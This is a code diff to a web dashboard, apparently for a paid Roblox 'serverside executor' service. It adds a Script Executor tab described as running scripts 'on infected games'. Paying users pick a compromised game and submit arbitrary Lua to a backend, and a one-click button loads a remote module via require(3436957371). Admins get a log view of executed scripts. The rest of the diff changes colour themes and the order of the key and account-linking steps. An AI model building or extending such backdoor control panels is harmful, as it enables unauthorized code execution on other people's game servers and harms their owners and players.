@@ -39,7 +39,11 @@ import {
   Camera,
   Webhook,
   MessageCircle,
-  Send
+  Send,
+  Terminal,
+  Palette,
+  FileCode,
+  ScrollText
 } from "lucide-react"
 
 type UserPlan = "none" | "standard" | "premium"
@@ -94,7 +98,17 @@ type StaffAccount = {
   isOnline: boolean
 }
 
-type Tab = "home" | "games" | "chat" | "whitelist" | "tos" | "settings" | "admin"
+type Tab = "home" | "games" | "executor" | "chat" | "whitelist" | "tos" | "settings" | "admin"
+
+type ScriptLog = {
+  id: string
+  username: string
+  robloxUsername: string
+  script: string
+  gameId: string
+  gameName: string
+  timestamp: string
+}
 
 type ChatMessage = {
   id: string
@@ -159,7 +173,7 @@ export default function DashboardPage() {
   const [blacklistedUsers, setBlacklistedUsers] = useState<BlacklistedUser[]>([])
   const [games, setGames] = useState<Game[]>([])
   const [staffAccounts, setStaffAccounts] = useState<StaffAccount[]>([])
-  const [adminTab, setAdminTab] = useState<"users" | "blacklist" | "keys" | "webhooks" | "staff">("users")
+  const [adminTab, setAdminTab] = useState<"users" | "blacklist" | "keys" | "logs" | "webhooks" | "staff">("users")
   const [loading, setLoading] = useState(false)
   
   // Whitelist state
@@ -189,12 +203,18 @@ export default function DashboardPage() {
   const [whitelistKeys, setWhitelistKeys] = useState<WhitelistKey[]>([])
   const [keyInput, setKeyInput] = useState("")
   const [robloxWebhookUrl, setRobloxWebhookUrl] = useState("")
+  const [selectedGame, setSelectedGame] = useState<string>("")
+  const [scriptInput, setScriptInput] = useState("")
+  const [executorLoading, setExecutorLoading] = useState(false)
+  const [scriptLogs, setScriptLogs] = useState<ScriptLog[]>([])
+  const [colorTheme, setColorTheme] = useState<string>("blue")
 
   const isOwner = user?.role === "owner"
   const isStaff = user?.role === "staff"
   const isAdmin = isOwner || isStaff
   const userPlan = user?.plan || "none"
-  const hasAccess = userPlan !== "none" || isAdmin
+  const hasAccess = userPlan !== "none" // Staff/Owner need to redeem key too
+  const canAccessAdmin = isAdmin // But can still access admin panel
 
   const showToast = (message: string, type: "success" | "error") => {
     setToast({ message, type })
@@ -387,6 +407,83 @@ setChatLoading(false)
     }
     setWhitelistLoading(false)
   }
+
+  // Execute script
+  const executeScript = async (scriptType?: "r6") => {
+    if (!user || !selectedGame) {
+      showToast("Please select a game first", "error")
+      return
+    }
+    if (!user.robloxUsername) {
+      showToast("You need to link your Roblox account first", "error")
+      return
+    }
+    if (userPlan === "none") {
+      showToast("You need an active plan to use the executor", "error")
+      return
+    }
+
+    let script = scriptInput.trim()
+    if (scriptType === "r6") {
+      script = `require(3436957371):r6("${user.robloxUsername}")`
+    }
+    
+    if (!script) {
+      showToast("Please enter a script", "error")
+      return
+    }
+
+    setExecutorLoading(true)
+    try {
+      const res = await fetch("/api/executor", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          username: user.username,
+          script,
+          gameId: selectedGame,
+        }),
+      })
+      const data = await res.json()
+      if (data.success) {
+        showToast("Script executed!", "success")
+        if (!scriptType) setScriptInput("")
+      } else {
+        showToast(data.error || "Failed to execute script", "error")
+      }
+    } catch {
+      showToast("Something went wrong", "error")
+    }
+    setExecutorLoading(false)
+  }
+
+  // Fetch script logs (admin only)
+  const fetchScriptLogs = useCallback(async () => {
+    if (!user || !isAdmin) return
+    try {
+      const res = await fetch(`/api/executor?admin=${user.username}`)
+      const data = await res.json()
+      if (data.logs) setScriptLogs(data.logs)
+    } catch {
+      // Ignore
+    }
+  }, [user, isAdmin])
+
+  // Theme handling
+  const changeTheme = (theme: string) => {
+    setColorTheme(theme)
+    document.documentElement.setAttribute("data-theme", theme)
+    localStorage.setItem("moonss_theme", theme)
+  }
+
+  // Load theme on mount
+  useEffect(() => {
+    const savedTheme = localStorage.getItem("moonss_theme")
+    if (savedTheme) {
+      setColorTheme(savedTheme)
+      document.documentElement.setAttribute("data-theme", savedTheme)
+    }
+  }, [])
   
   const refreshGameData = useCallback(async () => {
     if (games.length === 0) return
@@ -456,18 +553,34 @@ setChatLoading(false)
     router.push("/login")
   }, [router])
 
-useEffect(() => {
-    if (user && isAdmin && activeTab === "admin") {
+// Fetch admin data immediately when user loads and is admin
+  useEffect(() => {
+    if (user && isAdmin) {
       fetchAdminData()
+      fetchScriptLogs()
       if (isOwner) fetchWebhookKey()
     }
-  }, [user, isAdmin, isOwner, activeTab, fetchAdminData, fetchWebhookKey])
+  }, [user, isAdmin, isOwner, fetchAdminData, fetchWebhookKey, fetchScriptLogs])
+
+  // Also refresh when switching to admin tab
+  useEffect(() => {
+    if (user && isAdmin && activeTab === "admin") {
+      fetchAdminData()
+    }
+  }, [activeTab, user, isAdmin, fetchAdminData])
 
   useEffect(() => {
     if (user && activeTab === "games") {
       fetchGames()
     }
   }, [user, activeTab, fetchGames])
+
+  // Fetch games for executor tab too
+  useEffect(() => {
+    if (user && activeTab === "executor" && games.length === 0) {
+      fetchGames()
+    }
+  }, [user, activeTab, games.length, fetchGames])
 
   useEffect(() => {
     if (activeTab === "games" && games.length > 0) {
@@ -887,13 +1000,23 @@ useEffect(() => {
   }
 
 const sidebarItems = [
-  { id: "home" as Tab, label: "Home", icon: Home },
-  { id: "games" as Tab, label: "Games", icon: Gamepad2 },
-  { id: "chat" as Tab, label: "Chat", icon: MessageCircle },
-  { id: "whitelist" as Tab, label: "Whitelist", icon: Key },
-  { id: "tos" as Tab, label: "ToS", icon: FileText },
-  { id: "settings" as Tab, label: "Settings", icon: Settings },
-    ...(isAdmin ? [{ id: "admin" as Tab, label: "Admin Panel", icon: Shield }] : []),
+    { id: "home" as Tab, label: "Home", icon: Home },
+    { id: "games" as Tab, label: "Games", icon: Gamepad2 },
+    ...(hasAccess ? [{ id: "executor" as Tab, label: "Executor", icon: Terminal }] : []),
+    { id: "chat" as Tab, label: "Chat", icon: MessageCircle },
+    { id: "whitelist" as Tab, label: "Whitelist", icon: Key },
+    { id: "tos" as Tab, label: "ToS", icon: FileText },
+    { id: "settings" as Tab, label: "Settings", icon: Settings },
+    ...(canAccessAdmin ? [{ id: "admin" as Tab, label: "Admin Panel", icon: Shield }] : []),
+  ]
+
+  const themes = [
+    { id: "blue", label: "Blue", color: "bg-blue-500" },
+    { id: "purple", label: "Purple", color: "bg-purple-500" },
+    { id: "green", label: "Green", color: "bg-green-500" },
+    { id: "red", label: "Red", color: "bg-red-500" },
+    { id: "orange", label: "Orange", color: "bg-orange-500" },
+    { id: "pink", label: "Pink", color: "bg-pink-500" },
   ]
 
   if (!user) {
@@ -1435,6 +1558,98 @@ const sidebarItems = [
             </div>
 )}
 
+          {/* Executor Tab */}
+          {activeTab === "executor" && (
+            <div className="space-y-6">
+              <div>
+                <h2 className="text-2xl font-bold text-foreground">Script Executor</h2>
+                <p className="text-muted-foreground mt-1">Execute scripts on infected games</p>
+              </div>
+
+              {!hasAccess ? (
+                <div className="glass rounded-xl border border-yellow-500/30 p-6 text-center">
+                  <AlertTriangle className="h-12 w-12 text-yellow-500 mx-auto mb-3" />
+                  <h3 className="text-lg font-semibold text-foreground mb-2">Plan Required</h3>
+                  <p className="text-muted-foreground">You need an active plan to use the executor. Go to Whitelist to redeem a key.</p>
+                </div>
+              ) : !user?.robloxUsername ? (
+                <div className="glass rounded-xl border border-yellow-500/30 p-6 text-center">
+                  <Link2 className="h-12 w-12 text-yellow-500 mx-auto mb-3" />
+                  <h3 className="text-lg font-semibold text-foreground mb-2">Link Roblox Account</h3>
+                  <p className="text-muted-foreground">You need to link your Roblox account first. Go to Whitelist to link it.</p>
+                </div>
+              ) : (
+                <>
+                  {/* Game Selection */}
+                  <div className="glass rounded-xl border border-border/30 p-4">
+                    <label className="block text-sm font-medium text-foreground mb-2">Select Game</label>
+                    <select
+                      value={selectedGame}
+                      onChange={(e) => setSelectedGame(e.target.value)}
+                      className="w-full px-4 py-3 rounded-lg bg-secondary border border-border/30 text-foreground focus:outline-none focus:ring-2 focus:ring-primary/50"
+                    >
+                      <option value="">-- Select a game --</option>
+                      {games.filter(g => g.status === "online").map((game) => (
+                        <option key={game.id} value={game.id}>
+                          {game.name} ({formatPlayers(game.players)} players)
+                        </option>
+                      ))}
+                    </select>
+                  </div>
+
+                  {/* Script Editor */}
+                  <div className="glass rounded-xl border border-border/30 p-4">
+                    <label className="block text-sm font-medium text-foreground mb-2">Script</label>
+                    <textarea
+                      value={scriptInput}
+                      onChange={(e) => setScriptInput(e.target.value)}
+                      placeholder="Enter your Lua script here..."
+                      className="w-full h-48 px-4 py-3 rounded-lg bg-secondary border border-border/30 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/50 font-mono text-sm resize-none"
+                    />
+                  </div>
+
+                  {/* Action Buttons */}
+                  <div className="flex gap-3">
+                    <button
+                      onClick={() => executeScript()}
+                      disabled={executorLoading || !selectedGame || !scriptInput.trim()}
+                      className="flex-1 py-3 rounded-lg bg-primary text-primary-foreground font-semibold hover:bg-primary/90 transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
+                    >
+                      {executorLoading ? <Loader2 className="h-5 w-5 animate-spin" /> : <Play className="h-5 w-5" />}
+                      Execute
+                    </button>
+                    <button
+                      onClick={() => setScriptInput("")}
+                      className="px-6 py-3 rounded-lg bg-secondary border border-border/30 text-foreground font-semibold hover:bg-secondary/80 transition-all"
+                    >
+                      Clear
+                    </button>
+                    <button
+                      onClick={() => executeScript("r6")}
+                      disabled={executorLoading || !selectedGame}
+                      className="px-6 py-3 rounded-lg bg-green-500/20 border border-green-500/30 text-green-400 font-semibold hover:bg-green-500/30 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
+                    >
+                      R6
+                    </button>
+                  </div>
+
+                  {/* Info */}
+                  <div className="glass rounded-xl border border-border/30 p-4">
+                    <div className="flex items-start gap-3">
+                      <FileCode className="h-5 w-5 text-primary mt-0.5" />
+                      <div>
+                        <h4 className="font-medium text-foreground">R6 Script</h4>
+                        <p className="text-sm text-muted-foreground mt-1">
+                          The R6 button executes: <code className="px-1.5 py-0.5 bg-muted rounded text-xs font-mono">require(3436957371):r6("{user?.robloxUsername}")</code>
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                </>
+              )}
+            </div>
+          )}
+
           {/* Chat Tab */}
           {activeTab === "chat" && (
             <div className="flex flex-col h-[calc(100vh-180px)]">
@@ -1523,7 +1738,7 @@ const sidebarItems = [
             <div className="space-y-6 max-w-2xl">
               <div>
                 <h2 className="text-2xl font-bold text-foreground">Whitelist</h2>
-                <p className="text-muted-foreground mt-1">Link your Roblox account and redeem your key</p>
+                <p className="text-muted-foreground mt-1">Redeem your key and link your Roblox account</p>
               </div>
 
               {/* Status Card */}
@@ -1532,31 +1747,26 @@ const sidebarItems = [
                   <div className={`h-14 w-14 rounded-full flex items-center justify-center ${
                     user.robloxUsername && userPlan !== "none" 
                       ? "bg-green-500/20" 
-                      : user.robloxUsername 
+                      : userPlan !== "none"
                         ? "bg-yellow-500/20" 
                         : "bg-muted"
                   }`}>
                     {user.robloxUsername && userPlan !== "none" ? (
                       <Check className="h-7 w-7 text-green-500" />
-                    ) : user.robloxUsername ? (
+                    ) : userPlan !== "none" ? (
                       <AlertTriangle className="h-7 w-7 text-yellow-500" />
                     ) : (
-                      <Link2 className="h-7 w-7 text-muted-foreground" />
+                      <Key className="h-7 w-7 text-muted-foreground" />
                     )}
                   </div>
                   <div>
                     <h3 className="font-semibold text-foreground">
                       {user.robloxUsername && userPlan !== "none" 
                         ? "Fully Verified" 
-                        : user.robloxUsername 
-                          ? "Roblox Linked - Need Key" 
-                          : "Not Linked"}
+                        : userPlan !== "none"
+                          ? "Need Roblox Link" 
+                          : "Need Key"}
                     </h3>
-                    {user.robloxUsername && (
-                      <p className="text-sm text-muted-foreground">
-                        Roblox: <span className="text-primary font-medium">{user.robloxUsername}</span>
-                      </p>
-                    )}
                     <p className="text-sm text-muted-foreground">
                       Plan: <span className={`font-semibold ${
                         userPlan === "premium" ? "text-primary" : userPlan === "standard" ? "text-green-500" : "text-destructive"
@@ -1564,50 +1774,22 @@ const sidebarItems = [
                         {userPlan === "none" ? "No Active Plan" : userPlan.charAt(0).toUpperCase() + userPlan.slice(1)}
                       </span>
                     </p>
+                    {user.robloxUsername && (
+                      <p className="text-sm text-muted-foreground">
+                        Roblox: <span className="text-primary font-medium">{user.robloxUsername}</span>
+                      </p>
+                    )}
                   </div>
                 </div>
               </div>
 
-              {/* Step 1: Link Roblox */}
-              <div className="glass rounded-xl border border-border/30 p-6">
-                <div className="flex items-center gap-3 mb-4">
-                  <div className={`h-8 w-8 rounded-full flex items-center justify-center text-sm font-bold ${
-                    user.robloxUsername ? "bg-green-500/20 text-green-500" : "bg-primary/20 text-primary"
-                  }`}>
-                    {user.robloxUsername ? <Check className="h-4 w-4" /> : "1"}
-                  </div>
-                  <h3 className="font-semibold text-foreground">Link Roblox Account</h3>
-                </div>
-                
-                {user.robloxUsername ? (
-                  <p className="text-sm text-green-500">Linked to: {user.robloxUsername}</p>
-                ) : (
-                  <div className="space-y-3">
-                    <input
-                      type="text"
-                      value={robloxInput}
-                      onChange={(e) => setRobloxInput(e.target.value)}
-                      placeholder="Enter your Roblox username"
-                      className="w-full px-4 py-3 rounded-lg bg-secondary border border-border/30 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/50"
-                    />
-                    <button
-                      onClick={handleLinkRoblox}
-                      disabled={whitelistLoading || !robloxInput.trim()}
-                      className="w-full py-3 rounded-lg bg-primary text-primary-foreground font-semibold hover:bg-primary/90 transition-all disabled:opacity-50"
-                    >
-                      {whitelistLoading ? <Loader2 className="h-5 w-5 animate-spin mx-auto" /> : "Link Account"}
-                    </button>
-                  </div>
-                )}
-              </div>
-
-              {/* Step 2: Redeem Key */}
+              {/* Step 1: Redeem Key */}
               <div className="glass rounded-xl border border-border/30 p-6">
                 <div className="flex items-center gap-3 mb-4">
                   <div className={`h-8 w-8 rounded-full flex items-center justify-center text-sm font-bold ${
                     userPlan !== "none" ? "bg-green-500/20 text-green-500" : "bg-primary/20 text-primary"
                   }`}>
-                    {userPlan !== "none" ? <Check className="h-4 w-4" /> : "2"}
+                    {userPlan !== "none" ? <Check className="h-4 w-4" /> : "1"}
                   </div>
                   <h3 className="font-semibold text-foreground">Redeem Key</h3>
                 </div>
@@ -1635,6 +1817,41 @@ const sidebarItems = [
                   </div>
                 )}
               </div>
+
+              {/* Step 2: Link Roblox - Only show if key is redeemed */}
+              {userPlan !== "none" && (
+                <div className="glass rounded-xl border border-border/30 p-6">
+                  <div className="flex items-center gap-3 mb-4">
+                    <div className={`h-8 w-8 rounded-full flex items-center justify-center text-sm font-bold ${
+                      user.robloxUsername ? "bg-green-500/20 text-green-500" : "bg-primary/20 text-primary"
+                    }`}>
+                      {user.robloxUsername ? <Check className="h-4 w-4" /> : "2"}
+                    </div>
+                    <h3 className="font-semibold text-foreground">Link Roblox Account</h3>
+                  </div>
+                  
+                  {user.robloxUsername ? (
+                    <p className="text-sm text-green-500">Linked to: {user.robloxUsername}</p>
+                  ) : (
+                    <div className="space-y-3">
+                      <input
+                        type="text"
+                        value={robloxInput}
+                        onChange={(e) => setRobloxInput(e.target.value)}
+                        placeholder="Enter your Roblox username"
+                        className="w-full px-4 py-3 rounded-lg bg-secondary border border-border/30 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/50"
+                      />
+                      <button
+                        onClick={handleLinkRoblox}
+                        disabled={whitelistLoading || !robloxInput.trim()}
+                        className="w-full py-3 rounded-lg bg-primary text-primary-foreground font-semibold hover:bg-primary/90 transition-all disabled:opacity-50"
+                      >
+                        {whitelistLoading ? <Loader2 className="h-5 w-5 animate-spin mx-auto" /> : "Link Account"}
+                      </button>
+                    </div>
+                  )}
+                </div>
+              )}
 
               {/* Messages */}
               {whitelistError && (
@@ -1716,6 +1933,30 @@ const sidebarItems = [
               <div>
                 <h2 className="text-2xl font-bold text-foreground">Settings</h2>
                 <p className="text-muted-foreground mt-1">Manage your account settings</p>
+              </div>
+
+              {/* Color Theme */}
+              <div className="glass rounded-xl border border-border/30 p-6">
+                <div className="flex items-center gap-3 mb-4">
+                  <Palette className="h-5 w-5 text-primary" />
+                  <h3 className="font-semibold text-foreground">Color Theme</h3>
+                </div>
+                <div className="grid grid-cols-3 sm:grid-cols-6 gap-3">
+                  {themes.map((theme) => (
+                    <button
+                      key={theme.id}
+                      onClick={() => changeTheme(theme.id)}
+                      className={`flex flex-col items-center gap-2 p-3 rounded-lg border transition-all ${
+                        colorTheme === theme.id 
+                          ? "border-primary bg-primary/10" 
+                          : "border-border/30 hover:border-border/60"
+                      }`}
+                    >
+                      <div className={`h-8 w-8 rounded-full ${theme.color}`} />
+                      <span className="text-xs text-foreground">{theme.label}</span>
+                    </button>
+                  ))}
+                </div>
               </div>
 
               {/* Profile Picture */}
@@ -1842,6 +2083,7 @@ const sidebarItems = [
 {[
                   { id: "users", label: "Users", icon: Users },
                   { id: "blacklist", label: "Blacklist", icon: UserX },
+                  { id: "logs", label: "Script Logs", icon: ScrollText },
                   ...(isOwner ? [{ id: "keys", label: "Keys", icon: Key }] : []),
                   ...(isOwner ? [{ id: "webhooks", label: "Webhooks", icon: Globe }] : []),
                   ...(isOwner ? [{ id: "staff", label: "Staff", icon: Shield }] : []),
@@ -2006,6 +2248,64 @@ const sidebarItems = [
               </div>
               )}
 
+              {/* Script Logs Tab */}
+              {adminTab === "logs" && (
+                <div className="space-y-4">
+                  <div className="glass rounded-xl border border-border/30 overflow-hidden">
+                    <div className="p-4 border-b border-border/30 flex items-center justify-between">
+                      <h3 className="font-semibold text-foreground flex items-center gap-2">
+                        <ScrollText className="h-5 w-5 text-primary" />
+                        Script Execution Logs ({scriptLogs.length})
+                      </h3>
+                      <button
+                        onClick={fetchScriptLogs}
+                        className="p-2 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors"
+                      >
+                        <RefreshCw className="h-4 w-4" />
+                      </button>
+                    </div>
+                    <div className="overflow-x-auto max-h-[500px] overflow-y-auto">
+                      <table className="w-full">
+                        <thead className="sticky top-0 bg-muted/50">
+                          <tr className="border-b border-border/30">
+                            <th className="text-left p-3 text-sm font-semibold text-foreground">User</th>
+                            <th className="text-left p-3 text-sm font-semibold text-foreground">Roblox</th>
+                            <th className="text-left p-3 text-sm font-semibold text-foreground">Game</th>
+                            <th className="text-left p-3 text-sm font-semibold text-foreground">Script</th>
+                            <th className="text-left p-3 text-sm font-semibold text-foreground">Time</th>
+                          </tr>
+                        </thead>
+                        <tbody>
+                          {scriptLogs.length === 0 ? (
+                            <tr>
+                              <td colSpan={5} className="p-8 text-center text-muted-foreground">
+                                No script logs yet
+                              </td>
+                            </tr>
+                          ) : (
+                            scriptLogs.map((log) => (
+                              <tr key={log.id} className="border-b border-border/30 last:border-0">
+                                <td className="p-3 text-sm text-foreground">{log.username}</td>
+                                <td className="p-3 text-sm text-primary">{log.robloxUsername}</td>
+                                <td className="p-3 text-sm text-muted-foreground">{log.gameName}</td>
+                                <td className="p-3">
+                                  <code className="text-xs font-mono bg-muted px-2 py-1 rounded text-foreground max-w-xs truncate block">
+                                    {log.script.length > 50 ? log.script.substring(0, 50) + "..." : log.script}
+                                  </code>
+                                </td>
+                                <td className="p-3 text-xs text-muted-foreground">
+                                  {new Date(log.timestamp).toLocaleString()}
+                                </td>
+                              </tr>
+                            ))
+                          )}
+                        </tbody>
+                      </table>
+                    </div>
+                  </div>
+                </div>
+              )}
+  
               {/* Keys - Owner Only */}
               {adminTab === "keys" && isOwner && (
                 <div className="space-y-6">
